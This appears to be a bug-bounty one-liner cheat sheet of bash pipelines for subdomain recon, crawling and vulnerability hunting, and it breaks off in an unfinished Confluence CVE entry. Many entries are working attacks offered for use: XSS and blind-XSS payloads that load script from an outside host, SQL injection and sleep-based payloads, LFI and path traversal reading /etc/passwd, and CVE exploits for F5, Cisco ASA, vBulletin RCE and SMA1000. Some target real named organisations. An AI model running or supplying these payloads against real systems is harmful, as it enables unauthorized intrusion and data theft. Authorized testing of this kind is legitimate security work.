curl -s "https://crt.sh/?q=%25.enjoei.com.br&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | httpx -silent -path /.git/HEAD -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
**Collect js files from hosts up by gospider**
```bash
xargs -P 500 -a pay -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s**] \- **n**" | anew'
```
**Subdomain search Bufferover resolving domain to httpx**
```bash
curl -s https://dns.bufferover.run/dns?q=.sony.com |jq -r .FDNS_A[] | sed -s 's/,/\n/g' | httpx -silent | anew
```
**Using gargs to gospider search with parallel proccess**
```bash
httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -l domain -timeout 5 -threads 200 --follow-redirects -silent | gargs -p 3 'gospider -m 5 --blacklist pdf -t 2 -c 300 -d 5 -a -s {}' | anew stepOne
```
**Injection xss using qsreplace to urls filter to gospider**
```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```
**Extract URL's to apk**
```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's****' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
```
**Chaos to Gospider**
```bash
chaos -d att.com -o att -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -s @
```
**Checking invalid certificate**
```bash
xargs -a domain -P1000 -I@ sh -c 'bash cert.sh @ 2> /dev/null' | grep "EXPIRED" | awk '/domain/{print $5}' | httpx
```
**Using shodan & Nuclei**
```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```
**Open Redirect test using gf.**
```bash
echo "domain" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf redirect | anew
```
**Using shodan to jaeles "How did I find a critical today? well as i said it was very simple, using shodan and jaeles".**
```bash
shodan domain domain| awk '{print $3}'|  httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @
```
**Using Chaos to jaeles "How did I find a critical today?.**
```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```
**Using shodan to jaeles**
```bash
domain="domaintotest";shodan domain $domain | awk -v domain="$domain" '{print $1"."domain}'| httpx -threads 300 | anew shodanHostsUp | xargs -I@ -P3 sh -c 'jaeles -c 300 scan -s jaeles-signatures/ -u @'| anew JaelesShodanHosts 
```
**Search to files using assetfinder and ffuf**
```bash
assetfinder att.com | sed 's**.****' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'
```
**HTTPX using new mode location and injection XSS using qsreplace.**
```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo '(http|https)://[^/"].*' | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>" "'
```
**Grap internal juicy paths and do requests to them.**
```bash
export domain="https://target";gospider -s $domain -d 3 -c 300 | awk '/linkfinder/{print $NF}' | grep -v "http" | grep -v "http" | unfurl paths | anew | xargs -I@ -P50 sh -c 'echo $domain@ | httpx -silent -content-length'
```
**Download to list bounty targets We inject using the sed .git/HEAD command at the end of each url.**
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's****.git/HEAD**' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```
**Using to findomain to SQLINJECTION.**
```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```
**Jaeles scan to bugbounty targets.**
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
**JLDC domain search subdomain, using rush and jaeles.**
```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```
**Chaos to search subdomains check cloudflareip scan port.**
```bash
chaos -silent -d paypal.com | filter-resolved | cf-check | anew | naabu -rate 60000 -silent -verify | httpx -title -silent
```
**Search JS to domains file.**
```bash
cat FILE TO TARGET | httpx -silent | subjs | anew
```
**Search JS using assetfinder, rush and hakrawler.**
```bash
assetfinder -subs-only paypal.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | rush 'hakrawler -plain -linkfinder -depth 5 -url {}' | grep "paypal"
```
**Search to CORS using assetfinder and rush**
```bash
assetfinder fitbit.com | httpx -threads 300 -follow-redirects -silent | rush -j200 'curl -m5 -s -I -H "Origin:evil.com" {} |  [[ $(grep -c "evil.com") -gt 0 ]] && printf "\n\033[0;32m[VUL TO CORS] - {}\e[m"' 2>/dev/null"
```
**Search to js using hakrawler and rush & unew**
```bash
cat hostsGospider | rush -j 100 'hakrawler -js -plain -usewayback -depth 6 -scope subs -url {} | unew hakrawlerHttpx'
```
**XARGS to dirsearch brute force.**
```bash
cat hosts | xargs -I@ sh -c 'python3 dirsearch.py -r -b -w path -u @ -i 200, 403, 401, 302 -e php,html,json,aspx,sql,asp,js' 
```
**Assetfinder to run massdns.**
```bash
assetfinder DOMAIN --subs-only | anew | massdns -r lists/resolvers.txt -t A -o S -w result.txt ; cat result.txt | sed 's/A.*//; s/CN.*// ; s/\..$//' | httpx -silent
```
**Extract path to js**
```bash
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\**.]*(?=(\"|\'|\`))" | sort -u 
```
**Find subdomains and Secrets with jsubfinder**
```bash
cat subdomsains.txt | httpx --silent | jsubfinder -s
```
**Search domains to Range-IPS.**
```bash
cat dod1 | awk '{print $1}' | xargs -I@ sh -c 'prips @ | hakrevdns -r 1.1.1.1' | awk '{print $2}' | sed -r 's/.$//g' | httpx -silent -timeout 25 | anew 
```
**Search new's domains using dnsgen.**
```bash
xargs -a army1 -I@ sh -c 'echo @' | dnsgen - | httpx -silent -threads 10000 | anew newdomain
```
**List ips, domain extract, using amass + wordlist**
```bash
amass enum -src -ip -active -brute -d navy.mil -o domain ; cat domain | cut -d']' -f 2 | awk '{print $1}' | sort -u > hosts-amass.txt ; cat domain | cut -d']' -f2 | awk '{print $2}' | tr ',' '\n' | sort -u > ips-amass.txt ; curl -s "https://crt.sh/?q=%.navy.mil&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt ; sed 's/$/.navy.mil/' dns-Jhaddix.txt_cleaned > hosts-wordlist.txt ; cat hosts-amass.txt hosts-crtsh.txt hosts-wordlist.txt | sort -u > hosts-all.txt
```
**Search domains using amass and search vul to nuclei.**
```bash
amass enum -passive -norecursive -d disa.mil -o domain ; httpx -l domain -silent -threads 10 | nuclei -t PATH -o result -timeout 30 
```
**Verify to cert using openssl.**
```bash
sed -ne 's/^\( *\)Subject:/\1/p;/X509v3 Subject Alternative Name/{
    N;s/^.*\n//;:a;s/^\( *\)\(.*\), /\1\2\n\1/;ta;p;q; }' < <(
    openssl x509 -noout -text -in <(
        openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' \
            -connect hackerone.com:443 ) )
```
**Search domains using openssl to cert.**
```bash
xargs -a recursivedomain -P50 -I@ sh -c 'openssl s_client -connect @:443 2>&1 '| sed -E -e 's/[[:blank:]]+/\n/g' | httpx -silent -threads 1000 | anew 
```
**Oneliner to get HTTP Titles:(Update! HTTPX does a better job :-) )**
```bash
for i in $(cat urls.txt ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?<=<title>)(.*)(?=</title>)')"; done | tee -a titles.txt
```
**Extract subdomains from IP range**
```bash
nmap IP_range | grep "domain" | awk '{print $5}'
```
**Find subdomains and takeover**
```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/fingerprints.json -v 3 >> takeover ;
```
**Extract juicy info from unpacked APK**
```bash
apktool d apk;grep -EHim "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder
```
**Gather all urls, send to burp**
```bash
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt
cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt
ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http:127.0.0.1:8080
```
**Extract all javascript links from a domain using gau and grep**
```bash
echo domain | gau | grep -Eo "https?://\S+?\.js" 
```
**Local File Inclusion**
```bash
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
**Open-redirect**
```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
```bash
cat waybackurl.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```
**XSS**
```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```
**Prototype Pollution**
```bash
sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULN"
```
**CVE-2020-5902**
```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```
**CVE-2020-3452**
```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```
**vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution**
```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```
**Find JS Files**
```bash
assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```
**Extract Endpoints from JS File**
```bash
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```
**Get CIDR & Orgz from Target Lists**
```bash
for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```
**Get Subdomains from RapidDNS.io**
```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1**esult" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/**esults//g' | sort -u
```
**Get Subdomains from BufferOver.run**
```bash
curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```
**Get Subdomains from Riddler.io**
```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:domain.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
**Get Subdomains from VirusTotal**
```bash
curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**Get Subdomains from CertSpotter**
```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=domain.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | tr -d '[]"\n ' | tr ',' '\n'
```
**Get Subdomains from Archive**
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
**Get Subdomains from JLDC**
```bash
curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**Get Subdomains from securitytrails**
```bash
curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u
```
**Bruteforcing subdomain using DNS Over**
```bash
while read sub;do echo "https://dns.google.com/resolve?name=$sub.domain.com&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u ; done < wordlists.txt
```
**Get Subdomains With sonar.omnisint.io**
```bash
curl --silent https://sonar.omnisint.io/subdomains/twitter.com | grep -oE "[a-zA-Z0-9._-]+\.twitter.com" | sort -u 
```
**Get Subdomains With synapsint.com**
```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2Fdomain.com" | grep -oE "[a-zA-Z0-9._-]+\.domain.com" | sort -u 
```
**Get Subdomains from crt.sh**
```bash
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
**Sort & Tested Domains from Recon.dev**
```bash
curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent
```
**Subdomain Bruteforcer with FFUF**
```bash
ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'
```
**Find All Allocated IP ranges for ASN given an IP address**
```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```
**Extract IPs from a File**
```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```
**Ports Scan without CloudFlare**
```bash
subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```
**Create Custom Wordlists**
```bash
gau domain.com| unfurl -u keys | tee -a wordlist.txt ; gau domain.com | unfurl -u paths|tee -a ends.txt; sed 's****n**' ends.txt  | sort -u | tee -a wordlist.txt | sort -u ;rm ends.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' wordlist.txt
```
```bash
cat domains.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt  
```
**Extracts Juicy Informations**
```bash
for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done
```
**Find Subdomains TakeOver**
```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
**Get multiple target's Custom URLs from ParamSpider**
```bash
cat domains | xargs -I % python3 ~/tool/ParamSpider/paramspider.py -l high -o ./spidering/paramspider/% -d % ;
```
**URLs Probing with cURL + Parallel**
```bash
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```
**Dump In-scope Assets from `chaos-bugbounty-list`**
```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```
**Dump In-scope Assets from `bounty-targets-data`**
**HackerOne Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```
**BugCrowd Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**Intigriti Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```
**YesWeHack Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**HackenProof Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```
**Federacy Programs**
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```
**Get all the urls out of a sitemap.xml**
```bash
curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```
**Pure bash Linkfinder**
```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > jslinks.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < jslinks.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf jslinks.txt
```
**Extract Endpoints from swagger.json**
```bash
curl -s https://domain.tld/v2/swagger.json | jq '.paths | keys[]'
```
**CORS Misconfiguration**
```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```
**Find Hidden Servers and/or Admin Panels**
```bash
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 
```
**Recon using api.recon.dev**
```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=site.com | jg .[].domain
```
**Find live host/domain/assets**
```bash
subfinder -d http://tesla.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```
**XSS without gf**
```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
**Extract endpoints from APK files**
```bash
apkurlgrep -a path/to/file.apk
```
**Get Subdomains from IPs**
```bash
python3 hosthunter.py <target-ips.txt> > vhosts.txt
```
**webscreenshot**
```bash
python webscreenshot.py -i list.txt -w 40
```
**Removes duplicate URLs and parameter combinations**
```bash
cat urls.txt |qsreplace -a
```
**Gather domains from content-security-policy**
```bash
curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```
**Using dns.bufferover.run**
```bash
curl -s https://dns.bufferover.run/dns?q=.example.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```
**Using Crt.sh**
```bash
curl -s https://dns.bufferover.run/dns?q=.hackerone.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```
**Using Certspotter**
```bash
curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
```
**Using Certspotter (With port scanning)**
```bash
curl https://certspotter.com/api/v0/certs\?domain\=example.com | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq | dig +short -f - | uniq | nmap -T5 -Pn -sS -i - -p 80,443,21,22,8080,8081,8443 --open -n -oG -
```
**Sublist3r One Liner**

```bash
. <(cat domains | xargs -n1 -i{} python sublist3r.py -d {} -o {}.txt)
```
**Grab Titles of webpages** 
```bash
for i in $(cat Webservers.txt ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?<=<title>)(.*)(?=</title>)')"; done 
```
**Enumerate hosts from SSL Certificate**
```bash
echo | openssl s_client -connect https://targetdomain.com:443 | openssl x509 -noout -text | grep DNS
```
**Google DNS via HTTPS**
```bash
echo "targetdomain.com" | xargs -I domain proxychains curl -s "https://dns.google.com/resolve?name=domain&type=A" | jq .
```
**CommonCrawl to find endpoints on a site**
```bash
echo "targetdomain.com" | xargs -I domain curl -s "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.domain&output=json" | jq -r .url | sort -u
```
**Using WebArchive**
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | uniq
```
**Using ThreatCrowd**
```bash
curl https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=hackerone.com |jq .subdomains |grep -o '\w.*hackerone.com'
```
**Using Hackertarget**
```bash
curl https://api.hackertarget.com/hostsearch/?q=hackerone.com | grep -o '\w.*hackerone.com'
```
**Bruteforce Subdomains**
```bash
while read sub; do if host "$sub.example.com" &> /dev/null; then echo "$sub.example.com"; fi; done < wordslist.txt
```
**Assetfinder**
```bash
assetfinder http://hackerone.com > recon.txt; for d in $(<recon.txt); do $(cutycapt --url=$d --out=$d.jpg --max-wait=100000); done
```
**eb Recon Discovery**
```bash
subfinder -d TARGET.com -o subdomain.txt | httprobe -c 50 -t 100 | wfuzz -w worlist.txt -c -u 'http://FUZZ.TARGET.COM/' -H 'X-Forwarded-For: FUZZ' -v --hc 404 | grep -e "code-200" | awk '{print $5}' | grep -E '.php|.asp|.jsp' | hakcheckurl -verbose | grep -E 'high|medium' | sort -u >vuln_url.txt
```
```bash
echo http://testphp.vulnweb.com | waybackurls > wayback_urls_for_target.txt ; python3 sqlidetector.py -f  wayback_urls_for_target.txt
```
```bash
subfinder -d http://TARGET.com -silent -all | gau - blacklist ttf,woff,svg,png | sort -u | gf sqli >gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli_report.txt
```
```bash
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```
```bash
cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mSQLI by Cybertix\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
```
```bash
waybackurls target | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt && cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
```
**Header-Based Blind SQL injection**
```bash
cat domain.txt | httpx -silent -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(13),0))OR" -rt -timeout 20 -mrt '>13'
```
```bash
cat urls.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt
```
**Time based SQL injection using Waybackurls
```bash
waybackurls https://TARGET.COM | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt 
```
```bash
cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
```
```bash
waybackurls TARGET.COM | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
```
```bash
subfinder -dL domains.txt | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t Url-Redirection-Catcher.yaml -l open.txt
```
**NGINX Path Traversal**
```bash
httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
```
**Subdomain Takeover**
```bash
subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/cybertix/subjack/fingerprints.json -v 3 >> takeover ;
```
**Extract URLs from Source Code**
```bash
curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
```
**XSS (Cross-Site Scripting)**
```bash
echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
```
```bash
waybackurls http://testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox -b http://chirag.bxss.in pipe > output.txt
```
```bash
cat http://target.com | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind https://chirag.bxss.in
```
**Blind XSS Mass Hunting**
```bash
cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
```
**Find Endpoints in JS**
```bash
katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
```
**OneLiner for CVE-2023-23752 - 𝙅𝙤𝙤𝙢𝙡𝙖 𝙄𝙢𝙥𝙧𝙤𝙥𝙚𝙧 𝘼𝙘𝙘𝙚𝙨𝙨 𝙘𝙝𝙚𝙘𝙠 𝙞𝙣 𝙒𝙚𝙗𝙨𝙚𝙧𝙫𝙞𝙘𝙚 𝙀𝙣𝙙𝙥𝙤𝙞𝙣𝙩**
```bash
subfinder -d http://TARGET.COM -silent -all | httpx -silent -path 'api/index.php/v1/config/application?public=true' -mc 200
```
**cPanel CVE-2023-29489 XSS One-Liner**
```bash
subfinder -d http://example.com -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path '/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaaaaa' -mc 400
```
**WP-Config Oneliner**
```bash
subfinder -silent -d TARGET.com | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60 -status-code
```
**JS Secret Finder Oneliner**
```bash
shodan search org: "Target" http.favicon.hash:116323821 --fields ip_str,port--separator | awk '{print $1 $2}'
```
**Easiest Information Disclosure in JSON body**
```bash
cat subdomains.txt | waybackurls | httpx -mc 200 -ct | grep application/json
```
**Fuzz with 127.0.0.1 as Host header**
```bash
ffuf -u https://target[.]com/FUZZ -H “Host: 127.0.0.1” -w /home/user/path/to/wordlist.txt -fs <regular_content_length>
```
**CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000**
```bash
cat file.txt| while read host do;do curl -sk "http://$host:8443/images//////////////////../../../../../../../../etc/passwd" | grep -i 'root:' && echo $host "is VULN";done
```
**Get Favicon Hash of your target Domain**
```bash
curl -s -L -k https://TARGET.COM/favicon.ico | python3 -c 'import mmh3, sys, codecs; print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'
```
**CVE-2023-22515 One Liner Confluence Data Center & Server: Privilege Escalation**
```bash
